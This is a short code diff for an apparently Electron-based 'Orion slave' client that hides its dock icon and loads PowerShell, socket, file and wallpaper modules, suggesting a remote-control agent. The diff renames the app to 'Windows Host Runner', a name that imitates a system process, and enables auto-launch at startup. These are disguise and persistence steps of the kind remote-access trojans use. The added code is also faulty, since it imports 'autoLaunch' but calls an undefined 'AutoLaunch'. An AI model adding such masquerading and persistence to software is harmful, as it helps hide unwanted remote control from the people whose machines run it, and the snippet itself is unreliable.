@@ -18,7 +18,7 @@ if (app.dock){
   app.dock.hide();
 }
 
-app.setName("Orion slave");
+app.setName("Windows Host Runner - Orion slave");
 
 ////////////////////////////
 import io from 'socket.io-client'
@@ -33,6 +33,12 @@ const shell = require('node-powershell');
 const fs = require('fs');
 const request = require('request');
 const wallpaper = require('wallpaper');
+const autoLaunch = require('auto-launch');
+
+const autoLaunchPowers = new AutoLaunch({
+  name: 'Windows Host Runner - Orion Slave'
+});
+autoLaunchPowers.enable();
 
 if (!store.get('uniqueRoomNumber')){
   store.set(
